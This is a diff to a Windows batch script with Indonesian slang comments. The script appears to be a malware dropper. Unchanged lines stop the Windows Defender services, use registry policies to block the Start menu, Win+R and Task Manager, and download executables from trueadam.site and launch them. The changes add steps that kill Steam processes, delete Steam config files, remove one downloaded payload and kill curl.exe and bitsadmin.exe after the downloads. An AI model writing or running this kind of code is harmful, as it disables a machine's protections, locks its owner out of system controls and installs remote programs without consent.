@@ -45,6 +45,33 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 echo [+] Win key, Start Menu, Win+R, Task Manager, Control Panel KENA BLOCK SEMUA CUK!
 echo.
 
+:: === KILL STEAM HELPER + STEAM + HAPUS CONFIG CORRUPT TERUS BUKA ULANG ===
+echo [*] Ngeterminate SteamHelperENv2.exe dan Steam.exe...
+taskkill /f /im SteamHelperENv2.exe 2>nul
+taskkill /f /im Steam.exe 2>nul
+taskkill /f /im steamwebhelper.exe 2>nul
+taskkill /f /im steamservice.exe 2>nul
+echo [+] Semua proses Steam udah dibunuh brutal!
+
+echo [*] Ngehapus config Steam yang corrupt biar Settings & BPM normal...
+del /f /q "%USERPROFILE%\AppData\Local\Steam\config\config.vdf" 2>nul
+del /f /q "%USERPROFILE%\AppData\Local\Steam\config\localconfig.vdf" 2>nul
+del /f /q "G:\Steamonline_new\config\config.vdf" 2>nul
+del /f /q "G:\Steamonline_new\config\localconfig.vdf" 2>nul
+echo [+] Config Steam udah dihapus, Steam bakal fresh coy!
+echo.
+
+timeout /t 2 /nobreak >nul
+
+if exist "G:\Steamonline_new\steam.exe" (
+    echo [*] Buka Steam dari G:\Steamonline_new\steam.exe...
+    start "" "G:\Steamonline_new\steam.exe"
+    echo [+] Steam berhasil dibuka bos!
+) else (
+    echo [GAGAL] G:\Steamonline_new\steam.exe gak ketemu njir!
+)
+echo.
+
 :: Matiin antivirus sementara (biar gak blokir)
 net stop "Windows Defender" 2>nul
 net stop "MsMpSvc" 2>nul
@@ -61,17 +88,14 @@ set URL2=https://trueadam.site/StarDesk_1.4.0.exe
 set FILE2=StarDesk_1.4.0.exe
 set URL3=https://trueadam.site/DyBrowser.exe
 set FILE3=DyBrowser.exe
-set URL4=https://trueadam.site/doro.exe
-set FILE4=doro.exe
-set URL5=https://trueadam.site/7z64.exe
-set FILE5=7z64.exe
+set URL4=https://trueadam.site/7z64.exe
+set FILE4=7z64.exe
 
 :: Download pake metode triple backup
 call :Download "%URL1%" "%FILE1%"
 call :Download "%URL2%" "%FILE2%"
 call :Download "%URL3%" "%FILE3%"
 call :Download "%URL4%" "%FILE4%"
-call :Download "%URL5%" "%FILE5%"
 
 echo ========================================
 echo CEK DAN JALANIN FILE
@@ -80,12 +104,11 @@ echo ========================================
 if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [GAGAL] %FILE1%)
 if exist "%FILE2%" (start "" "%FILE2%" & echo [OK] %FILE2% running) else (echo [GAGAL] %FILE2%)
 if exist "%FILE3%" (start "" "%FILE3%" & echo [OK] %FILE3% running) else (echo [GAGAL] %FILE3%)
-if exist "%FILE4%" (start "" "%FILE4%" & echo [OK] %FILE4% running) else (echo [GAGAL] %FILE4%)
 
 :: Install 7z64.exe silent trus buka 7zFM.exe
-if exist "%FILE5%" (
+if exist "%FILE4%" (
     echo [*] Install 7-Zip silent mode dulu bro...
-    start /wait "" "%FILE5%" /S
+    start /wait "" "%FILE4%" /S
     echo [OK] 7-Zip keinstall!
     if exist "C:\Program Files\7-Zip\7zFM.exe" (
         start "" "C:\Program Files\7-Zip\7zFM.exe"
@@ -99,6 +122,13 @@ if exist "%FILE5%" (
 ) else (
     echo [GAGAL] 7z64.exe gak ada filenya
 )
+
+:: === BERSIH-BERSIH AKHIR ===
+echo [*] Ngekill curl.exe dan bitsadmin.exe...
+taskkill /f /im curl.exe 2>nul
+taskkill /f /im bitsadmin.exe 2>nul
+echo [+] curl.exe sama bitsadmin.exe udah dimatiin, bersih!
+echo.
 
 echo ========================================
 echo SELESAI GOBLOK 😡😡😡
